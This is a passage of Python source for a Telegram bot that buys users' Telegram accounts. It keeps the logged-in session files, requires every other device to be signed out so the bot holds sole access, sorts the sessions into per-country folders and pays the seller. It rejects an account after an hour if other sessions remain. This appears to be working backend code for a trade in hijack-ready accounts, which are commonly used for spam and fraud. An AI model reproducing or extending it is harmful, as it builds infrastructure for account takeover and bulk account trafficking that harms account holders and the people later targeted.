                bot.edit_message_text(
                    chat_id=message.chat.id, 
                    message_id=received_msg.message_id, 
                    text=f"❌ **This account cannot be received because it is unauthorized.**"
                )
            except:
                bot.send_message(message.chat.id, f"❌ **This account cannot be received because it is unauthorized.**")
            
            try:
                await data["client"].disconnect()
                if os.path.exists(f"{data['session_path']}.session"):
                    shutil.move(f"{data['session_path']}.session", os.path.join(TRASH_STORAGE_DIR, f"{data['clean_phone']}.session"))
            except: pass
            if tracker_id in live_trackers: del live_trackers[tracker_id]
            return

        auths = await data["client"](functions.account.GetAuthorizationsRequest())
        other_devices = [a for a in auths.authorizations if not a.current]
        
        if len(other_devices) == 0:
            await data["client"].disconnect()
            final_country_dir = os.path.join(BASE_STORAGE_DIR, data['country_code'])
            os.makedirs(final_country_dir, exist_ok=True)
            
            if os.path.exists(f"{data['session_path']}.session"):
                shutil.move(f"{data['session_path']}.session", os.path.join(final_country_dir, f"+{data['clean_phone']}.session"))
            
            convert_pending_to_verified(user_id, price)
            try: bot.delete_message(message.chat.id, received_msg.message_id)
            except: pass
            bot.send_message(message.chat.id, f"✅ Congratulations, the account `{data['phone']}` has been successfully verified.")
            if tracker_id in live_trackers: del live_trackers[tracker_id]
            return
            
    except:
        if tracker_id in live_trackers: del live_trackers[tracker_id]
        return
        
    bot.send_message(
        message.chat.id, 
        f"⚠️ Multiple active sessions detected for the number!**\n\nAccount: `{data['phone']}`\n\n📝 Total devices are more than 1 device. Your account will be reprocessed after 1 hours."
    )
    
    max_wait_extended = 3600  
    interval = 600             
    elapsed = 0
    
    while elapsed < max_wait_extended:
        await asyncio.sleep(interval)
        elapsed += interval
        try:
            if not data["client"].is_connected(): await data["client"].connect()
            
            # ১ ঘণ্টার ভেতরেও যদি ইউজার বটের সেশন ওড়ায়
            if not await data["client"].is_user_authorized():
                reject_pending_account(user_id, price)
                # মেসেজটি এখন নাম্বারসহ যাবে
                bot.send_message(message.chat.id, f"❌ Account `{data['phone']}` rejected because device was cleared.")
                if os.path.exists(f"{data['session_path']}.session"):
                    shutil.move(f"{data['session_path']}.session", os.path.join(TRASH_STORAGE_DIR, f"{data['clean_phone']}.session"))
                if tracker_id in live_trackers: del live_trackers[tracker_id]
                return
                
            auths = await data["client"](functions.account.GetAuthorizationsRequest())
            other_devices = [a for a in auths.authorizations if not a.current]
            
            if len(other_devices) == 0:
                await data["client"].disconnect()
                final_country_dir = os.path.join(BASE_STORAGE_DIR, data['country_code'])
                os.makedirs(final_country_dir, exist_ok=True)
                if os.path.exists(f"{data['session_path']}.session"):
                    shutil.move(f"{data['session_path']}.session", os.path.join(final_country_dir, f"+{data['clean_phone']}.session"))
                convert_pending_to_verified(user_id, price)
                bot.send_message(message.chat.id, f"✅ Congratulations, the account `{data['phone']}` has been successfully verified.")
                if tracker_id in live_trackers: del live_trackers[tracker_id]
                return
            await data["client"].disconnect()
        except: pass

    reject_pending_account(user_id, price)
    try:
        if os.path.exists(f"{data['session_path']}.session"):
            shutil.move(f"{data['session_path']}.session", os.path.join(TIMED_OUT_STORAGE_DIR, f"{data['clean_phone']}.session"))
    except: pass
    bot.send_message(message.chat.id, f"❌ **Verification Failed!** Timeout (1 Hour).")
    if tracker_id in live_trackers: del live_trackers[tracker_id]

# ==================== MAIN RUNNER ====================
if __name__ == "__main__":
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.infinity_polling()
